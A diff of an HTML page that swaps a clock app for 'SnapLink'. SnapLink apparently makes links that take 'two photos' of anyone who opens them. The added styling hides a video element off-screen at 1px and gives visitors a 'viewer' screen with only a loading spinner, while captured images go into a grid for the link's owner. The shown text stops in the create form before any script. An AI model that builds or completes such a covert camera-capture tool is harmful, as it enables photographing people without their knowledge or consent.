@@ -1,608 +1,1120 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  
-  <title>Endroid Clock</title>
-  <meta name="description" content="Endroid Clock – a beautiful Material You 3 clock with digital & analog modes, smooth animations, and dynamic theming.">
-  <meta name="keywords" content="clock, digital clock, analog clock, Material You, Material 3, dark mode, PWA">
-  <meta name="author" content="Endroid">
-  <meta name="robots" content="index, follow">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>SnapLink</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet" />
+    <style>
+        /* ─── CSS Variables (Light/Dark) ─── */
+        :root {
+            --bg-primary: #0e0e12;
+            --bg-secondary: #14141b;
+            --bg-card: #1e1e29;
+            --bg-input: #111118;
+            --bg-nav: #1c1c26;
+            --border-color: #2a2a36;
+            --text-primary: #e6e6ed;
+            --text-secondary: #8a8a99;
+            --text-muted: #6a6a7a;
+            --accent-color: #7b9aff;
+            --accent-hover: #4b6ee6;
+            --shadow-color: rgba(123, 154, 255, 0.15);
+            --toast-bg: #1a1a26;
+            --toast-border: #7b9aff;
+            --toast-error-bg: #261a1a;
+            --toast-error-border: #f25a5a;
+            --toast-success-bg: #14281e;
+            --toast-success-border: #3dcd7a;
+            --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            --surface-container-high: #1a1a26;
+            --surface-container-lowest: #111118;
+            --on-surface-variant: #8a8a99;
+            --outline-variant: #2a2a36;
+        }
 
-  <meta property="og:title" content="Endroid Clock">
-  <meta property="og:description" content="A modern, expressive clock with Material You 3 design. Switch between digital and analog views.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://endroid.pages.dev/Clock/">
-  <meta property="og:image" content="https://endroid.pages.dev/Clock/icon.svg">
-  <meta property="og:image:alt" content="Endroid Clock Logo">
-  <meta property="og:site_name" content="Endroid">
+        [data-theme="light"] {
+            --bg-primary: #f5f5f7;
+            --bg-secondary: #ffffff;
+            --bg-card: #ffffff;
+            --bg-input: #f0f0f2;
+            --bg-nav: #ffffff;
+            --border-color: #d1d1d6;
+            --text-primary: #1c1c1e;
+            --text-secondary: #6c6c70;
+            --text-muted: #8e8e93;
+            --accent-color: #0066ff;
+            --accent-hover: #0055cc;
+            --shadow-color: rgba(0, 102, 255, 0.15);
+            --toast-bg: #ffffff;
+            --toast-border: #0066ff;
+            --toast-error-bg: #fde8e8;
+            --toast-error-border: #d32f2f;
+            --toast-success-bg: #e6f4ea;
+            --toast-success-border: #1e8e3e;
+            --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --surface-container-high: #e8ecf8;
+            --surface-container-lowest: #ffffff;
+            --on-surface-variant: #404753;
+            --outline-variant: #9fa5b4;
+        }
 
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Endroid Clock">
-  <meta name="twitter:description" content="A beautiful Material You 3 clock with digital & analog modes.">
-  <meta name="twitter:image" content="https://endroid.pages.dev/Clock/icon.svg">
-  <meta name="twitter:image:alt" content="Endroid Clock Logo">
+        /* ─── Reset & Base ─── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-  <meta name="theme-color" content="#53AAFF">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <meta name="apple-mobile-web-app-title" content="Endroid Clock">
-  <meta name="msapplication-TileImage" content="https://endroid.pages.dev/Clock/icon.svg">
-  <meta name="msapplication-TileColor" content="#53AAFF">
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            -webkit-font-smoothing: antialiased;
+            transition: background 0.3s, color 0.3s;
+        }
 
-  <link rel="icon" href="https://endroid.pages.dev/Clock/icon.svg" type="image/svg+xml">
-  <link rel="shortcut icon" href="https://endroid.pages.dev/Clock/icon.svg" type="image/svg+xml">
-  <link rel="apple-touch-icon" href="https://endroid.pages.dev/Clock/icon.svg">
+        #app {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 600px;
+            width: 100%;
+            background: var(--bg-secondary);
+            min-height: 100vh;
+            position: relative;
+            padding-bottom: 100px; /* space for bottom switcher */
+            transition: background 0.3s;
+        }
 
-  <link rel="manifest" href="https://endroid.pages.dev/Clock/manifest.json">
+        /* ─── App Bar ─── */
+        .app-bar {
+            display: flex;
+            align-items: center;
+            padding: 16px 20px 8px;
+            background: var(--bg-secondary);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            border-bottom: 1px solid var(--border-color);
+            transition: background 0.3s, border-color 0.3s;
+        }
+        .app-bar h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #b3c7ff, var(--accent-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .app-bar .spacer {
+            flex: 1;
+        }
+        .app-bar .material-symbols-outlined {
+            font-size: 28px;
+            color: var(--accent-color);
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+        .app-bar .material-symbols-outlined:hover {
+            background: var(--border-color);
+        }
 
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0,200&display=block" />
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+        /* ─── Tab Content ─── */
+        .tab-content {
+            flex: 1;
+            padding: 12px 16px 20px;
+            display: none; /* hidden by default */
+            animation: fadeIn 0.25s ease;
+        }
+        .tab-content.active {
+            display: block; /* only shown when active */
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0.5;
+                transform: translateY(6px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      user-select: none;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-    }
+        /* ─── Bottom Switcher (Pill Style) ─── */
+        .bottom-overlay {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            max-width: 600px;
+            width: calc(100% - 40px);
+            display: flex;
+            justify-content: center;
+            z-index: 20;
+        }
 
-    html, body {
-      height: 100%;
-      width: 100%;
-      overflow-x: hidden;
-    }
+        .mode-switch {
+            display: flex;
+            gap: 8px;
+            background: var(--surface-container-high);
+            padding: 8px;
+            border-radius: 100px;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 8px 28px rgba(0,0,0,0.2), 0 0 0 1px var(--outline-variant);
+            border: 1px solid var(--border-color);
+            width: 100%;
+            max-width: 360px;
+        }
 
-    :root {
-      --md-sys-color-primary-light: #005197;
-      --md-sys-color-on-primary-light: #ffffff;
-      --md-sys-color-primary-container-light: #65A7FF;
-      --md-sys-color-on-primary-container-light: #00305E;
-      --md-sys-color-secondary-light: #474F6F;
-      --md-sys-color-on-secondary-light: #ffffff;
-      --md-sys-color-secondary-container-light: #9CA4C8;
-      --md-sys-color-on-secondary-container-light: #272F4D;
-      --md-sys-color-tertiary-light: #4F4B7C;
-      --md-sys-color-on-tertiary-light: #ffffff;
-      --md-sys-color-tertiary-container-light: #A49FD6;
-      --md-sys-color-on-tertiary-container-light: #2E2A59;
-      --md-sys-color-background-light: #F9F9FF;
-      --md-sys-color-on-background-light: #171C24;
-      --md-sys-color-surface-light: #F9F9FF;
-      --md-sys-color-on-surface-light: #171C24;
-      --md-sys-color-surface-variant-light: #DCE3F2;
-      --md-sys-color-on-surface-variant-light: #404753;
-      --md-sys-color-surface-tint-light: #005FAF;
-      --md-sys-color-inverse-surface-light: #2B313A;
-      --md-sys-color-inverse-on-surface-light: #ECF1FD;
-      --md-sys-color-error-light: #A5030E;
-      --md-sys-color-on-error-light: #ffffff;
-      --md-sys-color-error-container-light: #FF7F72;
-      --md-sys-color-on-error-container-light: #680005;
-      --md-sys-color-outline-light: #666C79;
-      --md-sys-color-outline-variant-light: #9FA5B4;
-      --md-sys-color-surface-bright-light: #F9F9FF;
-      --md-sys-color-surface-dim-light: #CFD4E0;
-      --md-sys-color-surface-container-light: #E8ECF8;
-      --md-sys-color-surface-container-high-light: #E0E4F1;
-      --md-sys-color-surface-container-highest-light: #D9DDE9;
-      --md-sys-color-surface-container-low-light: #F0F3FF;
-      --md-sys-color-surface-container-lowest-light: #ffffff;
+        .mode-option {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 14px 12px;
+            border-radius: 100px;
+            font-weight: 600;
+            font-size: 1rem;
+            background: transparent;
+            color: var(--on-surface-variant);
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s, color 0.2s, box-shadow 0.2s, transform 0.1s;
+            font-family: inherit;
+        }
 
-      --md-sys-color-primary-dark: #A5C8FF;
-      --md-sys-color-on-primary-dark: #002B55;
-      --md-sys-color-primary-container-dark: #005EAD;
-      --md-sys-color-on-primary-container-dark: #DCE8FF;
-      --md-sys-color-secondary-dark: #BDC5EB;
-      --md-sys-color-on-secondary-dark: #212947;
-      --md-sys-color-secondary-container-dark: #545C7C;
-      --md-sys-color-on-secondary-container-dark: #E3E6FF;
-      --md-sys-color-tertiary-dark: #C6C0F9;
-      --md-sys-color-on-tertiary-dark: #282553;
-      --md-sys-color-tertiary-container-dark: #5B5789;
-      --md-sys-color-on-tertiary-container-dark: #E9E4FF;
-      --md-sys-color-background-dark: #0E141C;
-      --md-sys-color-on-background-dark: #DEE2EF;
-      --md-sys-color-surface-dark: #0E141C;
-      --md-sys-color-on-surface-dark: #DEE2EF;
-      --md-sys-color-surface-variant-dark: #404753;
-      --md-sys-color-on-surface-variant-dark: #C0C7D5;
-      --md-sys-color-surface-tint-dark: #A5C8FF;
-      --md-sys-color-inverse-surface-dark: #DEE2EF;
-      --md-sys-color-inverse-on-surface-dark: #2B313A;
-      --md-sys-color-error-dark: #FFB4AB;
-      --md-sys-color-on-error-dark: #5E0004;
-      --md-sys-color-error-container-dark: #B81919;
-      --md-sys-color-on-error-container-dark: #FFE1DD;
-      --md-sys-color-outline-dark: #8C93A0;
-      --md-sys-color-outline-variant-dark: #575D6A;
-      --md-sys-color-surface-bright-dark: #383D46;
-      --md-sys-color-surface-dim-dark: #0E141C;
-      --md-sys-color-surface-container-dark: #1D222B;
-      --md-sys-color-surface-container-high-dark: #282D36;
-      --md-sys-color-surface-container-highest-dark: #333841;
-      --md-sys-color-surface-container-low-dark: #171C25;
-      --md-sys-color-surface-container-lowest-dark: #070C15;
-    }
+        .mode-option:hover {
+            transform: scale(1.02);
+        }
 
-    body {
-      --md-sys-color-primary: var(--md-sys-color-primary-light);
-      --md-sys-color-on-primary: var(--md-sys-color-on-primary-light);
-      --md-sys-color-primary-container: var(--md-sys-color-primary-container-light);
-      --md-sys-color-on-primary-container: var(--md-sys-color-on-primary-container-light);
-      --md-sys-color-secondary: var(--md-sys-color-secondary-light);
-      --md-sys-color-on-secondary: var(--md-sys-color-on-secondary-light);
-      --md-sys-color-secondary-container: var(--md-sys-color-secondary-container-light);
-      --md-sys-color-on-secondary-container: var(--md-sys-color-on-secondary-container-light);
-      --md-sys-color-tertiary: var(--md-sys-color-tertiary-light);
-      --md-sys-color-on-tertiary: var(--md-sys-color-on-tertiary-light);
-      --md-sys-color-tertiary-container: var(--md-sys-color-tertiary-container-light);
-      --md-sys-color-on-tertiary-container: var(--md-sys-color-on-tertiary-container-light);
-      --md-sys-color-background: var(--md-sys-color-background-light);
-      --md-sys-color-on-background: var(--md-sys-color-on-background-light);
-      --md-sys-color-surface: var(--md-sys-color-surface-light);
-      --md-sys-color-on-surface: var(--md-sys-color-on-surface-light);
-      --md-sys-color-surface-variant: var(--md-sys-color-surface-variant-light);
-      --md-sys-color-on-surface-variant: var(--md-sys-color-on-surface-variant-light);
-      --md-sys-color-surface-tint: var(--md-sys-color-surface-tint-light);
-      --md-sys-color-inverse-surface: var(--md-sys-color-inverse-surface-light);
-      --md-sys-color-inverse-on-surface: var(--md-sys-color-inverse-on-surface-light);
-      --md-sys-color-error: var(--md-sys-color-error-light);
-      --md-sys-color-on-error: var(--md-sys-color-on-error-light);
-      --md-sys-color-error-container: var(--md-sys-color-error-container-light);
-      --md-sys-color-on-error-container: var(--md-sys-color-on-error-container-light);
-      --md-sys-color-outline: var(--md-sys-color-outline-light);
-      --md-sys-color-outline-variant: var(--md-sys-color-outline-variant-light);
-      --md-sys-color-surface-bright: var(--md-sys-color-surface-bright-light);
-      --md-sys-color-surface-dim: var(--md-sys-color-surface-dim-light);
-      --md-sys-color-surface-container: var(--md-sys-color-surface-container-light);
-      --md-sys-color-surface-container-high: var(--md-sys-color-surface-container-high-light);
-      --md-sys-color-surface-container-highest: var(--md-sys-color-surface-container-highest-light);
-      --md-sys-color-surface-container-low: var(--md-sys-color-surface-container-low-light);
-      --md-sys-color-surface-container-lowest: var(--md-sys-color-surface-container-lowest-light);
-    }
+        .mode-option:active {
+            transform: scale(0.98);
+        }
 
-    body.dark {
-      --md-sys-color-primary: var(--md-sys-color-primary-dark);
-      --md-sys-color-on-primary: var(--md-sys-color-on-primary-dark);
-      --md-sys-color-primary-container: var(--md-sys-color-primary-container-dark);
-      --md-sys-color-on-primary-container: var(--md-sys-color-on-primary-container-dark);
-      --md-sys-color-secondary: var(--md-sys-color-secondary-dark);
-      --md-sys-color-on-secondary: var(--md-sys-color-on-secondary-dark);
-      --md-sys-color-secondary-container: var(--md-sys-color-secondary-container-dark);
-      --md-sys-color-on-secondary-container: var(--md-sys-color-on-secondary-container-dark);
-      --md-sys-color-tertiary: var(--md-sys-color-tertiary-dark);
-      --md-sys-color-on-tertiary: var(--md-sys-color-on-tertiary-dark);
-      --md-sys-color-tertiary-container: var(--md-sys-color-tertiary-container-dark);
-      --md-sys-color-on-tertiary-container: var(--md-sys-color-on-tertiary-container-dark);
-      --md-sys-color-background: var(--md-sys-color-background-dark);
-      --md-sys-color-on-background: var(--md-sys-color-on-background-dark);
-      --md-sys-color-surface: var(--md-sys-color-surface-dark);
-      --md-sys-color-on-surface: var(--md-sys-color-on-surface-dark);
-      --md-sys-color-surface-variant: var(--md-sys-color-surface-variant-dark);
-      --md-sys-color-on-surface-variant: var(--md-sys-color-on-surface-variant-dark);
-      --md-sys-color-surface-tint: var(--md-sys-color-surface-tint-dark);
-      --md-sys-color-inverse-surface: var(--md-sys-color-inverse-surface-dark);
-      --md-sys-color-inverse-on-surface: var(--md-sys-color-inverse-on-surface-dark);
-      --md-sys-color-error: var(--md-sys-color-error-dark);
-      --md-sys-color-on-error: var(--md-sys-color-on-error-dark);
-      --md-sys-color-error-container: var(--md-sys-color-error-container-dark);
-      --md-sys-color-on-error-container: var(--md-sys-color-on-error-container-dark);
-      --md-sys-color-outline: var(--md-sys-color-outline-dark);
-      --md-sys-color-outline-variant: var(--md-sys-color-outline-variant-dark);
-      --md-sys-color-surface-bright: var(--md-sys-color-surface-bright-dark);
-      --md-sys-color-surface-dim: var(--md-sys-color-surface-dim-dark);
-      --md-sys-color-surface-container: var(--md-sys-color-surface-container-dark);
-      --md-sys-color-surface-container-high: var(--md-sys-color-surface-container-high-dark);
-      --md-sys-color-surface-container-highest: var(--md-sys-color-surface-container-highest-dark);
-      --md-sys-color-surface-container-low: var(--md-sys-color-surface-container-low-dark);
-      --md-sys-color-surface-container-lowest: var(--md-sys-color-surface-container-lowest-dark);
-    }
+        .mode-option .material-symbols-outlined {
+            font-size: 24px;
+        }
 
-    body {
-      font-family: 'Inter', system-ui, -apple-system, sans-serif;
-      background: var(--md-sys-color-background);
-      color: var(--md-sys-color-on-background);
-      display: flex;
-      flex-direction: column;
-      height: 100%;
-      width: 100%;
-      position: relative;
-    }
+        .mode-option.active {
+            background: var(--surface-container-lowest);
+            color: var(--text-primary);
+            box-shadow: 0 4px 14px rgba(0,0,0,0.12);
+        }
 
-    body.smooth-transition,
-    .smooth-transition * {
-      transition: background-color 0.3s cubic-bezier(0.2, 0.0, 0.0, 1.0),
-                  color 0.3s cubic-bezier(0.2, 0.0, 0.0, 1.0),
-                  border-color 0.3s cubic-bezier(0.2, 0.0, 0.0, 1.0),
-                  box-shadow 0.3s cubic-bezier(0.2, 0.0, 0.0, 1.0);
-    }
+        @media (max-width: 460px) {
+            .mode-option {
+                font-size: 0.9rem;
+                padding: 12px 8px;
+            }
+            .mode-option .material-symbols-outlined {
+                font-size: 20px;
+            }
+            .bottom-overlay {
+                width: calc(100% - 20px);
+                bottom: 16px;
+            }
+        }
 
-    .app-root {
-      display: flex;
-      flex-direction: column;
-      height: 100%;
-      width: 100%;
-      padding: 16px 20px 28px 20px;
-    }
+        /* ─── Cards ─── */
+        .card {
+            background: var(--bg-card);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 16px;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--card-shadow);
+            transition: background 0.3s, border-color 0.3s, box-shadow 0.3s;
+        }
+        .card-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .card-sub {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+        }
 
-    .header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 8px 0 8px 0;
-    }
+        /* ─── Form Inputs ─── */
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        .input-group input {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 14px 18px;
+            color: var(--text-primary);
+            font-size: 15px;
+            font-family: inherit;
+            outline: none;
+            transition: 0.2s;
+            width: 100%;
+        }
+        .input-group input:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 3px var(--shadow-color);
+        }
+        .btn {
+            background: var(--accent-color);
+            border: none;
+            border-radius: 20px;
+            padding: 14px 24px;
+            font-weight: 600;
+            font-size: 15px;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn:hover {
+            background: var(--accent-hover);
+        }
+        .btn:active {
+            transform: scale(0.96);
+        }
+        .btn-secondary {
+            background: var(--bg-input);
+            color: var(--accent-color);
+            border: 1px solid var(--border-color);
+        }
+        .btn-secondary:hover {
+            background: var(--border-color);
+        }
+        .btn-danger {
+            background: #d32f2f;
+            color: white;
+        }
+        .btn-danger:hover {
+            background: #b71c1c;
+        }
+        .btn-small {
+            padding: 6px 12px;
+            font-size: 12px;
+            border-radius: 14px;
+        }
 
-    .app-title {
-      font-size: 1.9rem;
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      color: var(--md-sys-color-primary);
-      background: var(--md-sys-color-surface-container-high);
-      padding: 10px 24px 10px 24px;
-      border-radius: 100px;
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      backdrop-filter: blur(4px);
-      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-    }
+        /* ─── Link Display ─── */
+        .link-box {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            background: var(--bg-input);
+            border-radius: 16px;
+            padding: 4px 4px 4px 18px;
+            margin-top: 8px;
+        }
+        .link-box input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--text-primary);
+            font-size: 14px;
+            padding: 12px 0;
+            outline: none;
+            min-width: 0;
+        }
+        .link-box .btn {
+            padding: 10px 18px;
+            font-size: 13px;
+            border-radius: 14px;
+        }
 
-    .app-title .material-symbols-rounded {
-      font-size: 32px;
-      color: var(--md-sys-color-primary);
-    }
+        /* ─── Toast Notifications ─── */
+        .toast {
+            padding: 12px 16px;
+            border-radius: 16px;
+            background: var(--toast-bg);
+            border-left: 4px solid var(--toast-border);
+            margin: 12px 0 0;
+            display: none;
+            font-size: 14px;
+            color: var(--text-primary);
+            transition: background 0.3s, border-color 0.3s, color 0.3s;
+        }
+        .toast.show {
+            display: block;
+        }
+        .toast.error {
+            border-left-color: var(--toast-error-border);
+            background: var(--toast-error-bg);
+            color: #d32f2f;
+        }
+        .toast.success {
+            border-left-color: var(--toast-success-border);
+            background: var(--toast-success-bg);
+            color: #1e8e3e;
+        }
 
-    .icon-button {
-      background: var(--md-sys-color-surface-container-high);
-      border: none;
-      color: var(--md-sys-color-on-surface-variant);
-      width: 60px;
-      height: 60px;
-      border-radius: 60px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-      backdrop-filter: blur(4px);
-    }
+        /* ─── Links List ─── */
+        .link-item {
+            background: var(--bg-card);
+            border-radius: 18px;
+            padding: 16px;
+            margin-bottom: 14px;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--card-shadow);
+            transition: background 0.3s, border-color 0.3s, box-shadow 0.3s;
+        }
+        .link-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .link-header strong {
+            font-size: 15px;
+            font-weight: 600;
+            word-break: break-all;
+        }
+        .link-header .badge {
+            font-size: 12px;
+            color: var(--text-secondary);
+            background: var(--bg-input);
+            padding: 4px 12px;
+            border-radius: 40px;
+        }
+        .link-meta {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+            word-break: break-all;
+        }
+        .link-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+        .capture-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .capture-item {
+            background: var(--bg-input);
+            border-radius: 14px;
+            padding: 10px;
+            position: relative;
+        }
+        .capture-item img {
+            width: 100%;
+            border-radius: 10px;
+            display: block;
+        }
+        .capture-meta {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-top: 6px;
+            line-height: 1.4;
+        }
+        .empty-state {
+            text-align: center;
+            color: var(--text-muted);
+            padding: 30px 0;
+        }
+        .empty-state .material-symbols-outlined {
+            font-size: 48px;
+            color: var(--border-color);
+            margin-bottom: 12px;
+        }
 
-    .icon-button:hover {
-      background: var(--md-sys-color-surface-container-highest);
-      transform: scale(1.05);
-    }
+        /* ─── Viewer Mode ─── */
+        .viewer-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 70vh;
+            text-align: center;
+            padding: 20px;
+        }
+        .viewer-container .spinner {
+            width: 64px;
+            height: 64px;
+            border: 4px solid var(--border-color);
+            border-top: 4px solid var(--accent-color);
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .viewer-container .status {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--accent-color);
+            margin-bottom: 8px;
+        }
+        .viewer-container .sub {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
 
-    .icon-button:active {
-      transform: scale(0.95);
-    }
-
-    .icon-button .material-symbols-rounded {
-      font-size: 32px;
-    }
-
-    .clock-main {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      margin: 8px 0 8px 0;
-      min-height: 0;
-    }
-
-    .digital-time {
-      font-weight: 700;
-      line-height: 1.1;
-      text-align: center;
-      font-variant-numeric: tabular-nums;
-      color: var(--md-sys-color-on-surface);
-      letter-spacing: 0.5vw;
-      word-break: break-word;
-      font-size: clamp(3rem, 18vw, 12rem);
-      width: 100%;
-      padding: 0 4px;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-
-    .analog-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      width: 100%;
-    }
-
-    .analog-clock {
-      width: min(72vmin, 340px);
-      height: min(72vmin, 340px);
-      border-radius: 50%;
-      background: var(--md-sys-color-surface-container-highest);
-      box-shadow: 0 12px 30px rgba(0,0,0,0.2);
-      position: relative;
-      border: 8px solid var(--md-sys-color-surface-bright);
-      transition: background 0.2s;
-    }
-
-    .analog-clock .center {
-      position: absolute;
-      width: 16px;
-      height: 16px;
-      background: var(--md-sys-color-primary);
-      border-radius: 50%;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 10;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    }
-
-    .hand {
-      position: absolute;
-      bottom: 50%;
-      left: 50%;
-      transform: translateX(-50%) rotate(0deg);
-      transform-origin: 50% 100%;
-      border-radius: 100px;
-      transition: transform 0.1s cubic-bezier(0.2, 0, 0, 1);
-    }
-
-    .hour-hand {
-      width: 8px;
-      height: 28%;
-      background: var(--md-sys-color-primary);
-    }
-    .minute-hand {
-      width: 5px;
-      height: 38%;
-      background: var(--md-sys-color-secondary);
-    }
-    .second-hand {
-      width: 2.5px;
-      height: 42%;
-      background: var(--md-sys-color-tertiary);
-    }
-
-    .date-label {
-      text-align: center;
-      color: var(--md-sys-color-on-surface-variant);
-      font-weight: 500;
-      font-size: 1.2rem;
-      letter-spacing: 0.3px;
-      background: var(--md-sys-color-surface-container);
-      padding: 12px 28px;
-      border-radius: 60px;
-      display: inline-block;
-      margin-top: 12px;
-      backdrop-filter: blur(4px);
-      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-    }
-
-    .bottom-overlay {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      width: 100%;
-      margin-top: auto;
-      padding: 8px 0 0 0;
-    }
-
-    .mode-switch {
-      display: flex;
-      gap: 8px;
-      background: var(--md-sys-color-surface-container-high);
-      padding: 10px 16px;
-      border-radius: 100px;
-      backdrop-filter: blur(20px);
-      box-shadow: 0 8px 28px rgba(0,0,0,0.2), 0 0 0 1px rgba(255,255,255,0.05);
-      border: 1px solid var(--md-sys-color-outline-variant);
-      margin-bottom: 4px;
-    }
-
-    .mode-option {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      padding: 14px 28px;
-      border-radius: 100px;
-      font-weight: 600;
-      font-size: 1.2rem;
-      background: transparent;
-      color: var(--md-sys-color-on-surface-variant);
-      border: none;
-      cursor: pointer;
-      transition: background 0.2s, color 0.2s, box-shadow 0.2s, transform 0.1s;
-      min-width: 140px;
-    }
-
-    .mode-option:hover {
-      transform: scale(1.02);
-    }
-
-    .mode-option:active {
-      transform: scale(0.98);
-    }
-
-    .mode-option .material-symbols-rounded {
-      font-size: 24px;
-    }
-
-    .mode-option.active {
-      background: var(--md-sys-color-surface-container-lowest);
-      color: var(--md-sys-color-on-surface);
-      box-shadow: 0 4px 14px rgba(0,0,0,0.12);
-    }
-
-    .hidden {
-      display: none !important;
-    }
-
-    @media (max-width: 460px) {
-      .mode-option {
-        padding: 12px 16px;
-        min-width: 120px;
-        font-size: 1rem;
-      }
-      .app-title {
-        font-size: 1.5rem;
-        padding: 8px 18px;
-      }
-      .date-label {
-        font-size: 1rem;
-        padding: 8px 16px;
-      }
-    }
-  </style>
+        /* ─── Utility ─── */
+        video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .flex-center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .gap-2 {
+            gap: 8px;
+        }
+        .text-muted {
+            color: var(--text-muted);
+        }
+        .text-center {
+            text-align: center;
+        }
+        .mt-2 {
+            margin-top: 8px;
+        }
+        .mb-2 {
+            margin-bottom: 8px;
+        }
+        .w-full {
+            width: 100%;
+        }
+        .flex-wrap {
+            flex-wrap: wrap;
+        }
+    </style>
 </head>
-<body class="smooth-transition">
-  <div class="app-root">
-    <div class="header">
-      <div class="app-title">
-        <span class="material-symbols-rounded">timer</span> Endroid Clock
-      </div>
-      <button class="icon-button" id="themeToggle" aria-label="switch theme">
-        <span class="material-symbols-rounded" id="themeIcon">light_mode</span>
-      </button>
-    </div>
+<body>
+    <div id="app">
+        <!-- App Bar -->
+        <header class="app-bar">
+            <h1>SnapLink</h1>
+            <div class="spacer"></div>
+            <span class="material-symbols-outlined" id="themeToggle" aria-label="Toggle theme">dark_mode</span>
+        </header>
 
-    <div class="clock-main">
-      <div id="digitalContainer">
-        <div class="digital-time" id="digitalTime">--:--:--</div>
-      </div>
-      <div id="analogContainer" class="analog-container hidden">
-        <div class="analog-clock" id="analogFace">
-          <div class="center"></div>
-          <div class="hand hour-hand" id="hourHand"></div>
-          <div class="hand minute-hand" id="minuteHand"></div>
-          <div class="hand second-hand" id="secondHand"></div>
+        <!-- Tab: Create -->
+        <section id="tab-create" class="tab-content active" role="tabpanel">
+            <div class="card">
+                <h2 class="card-title">Create a new link</h2>
+                <p class="card-sub">Anyone who opens it will capture two photos.</p>
+                <div class="input-group">
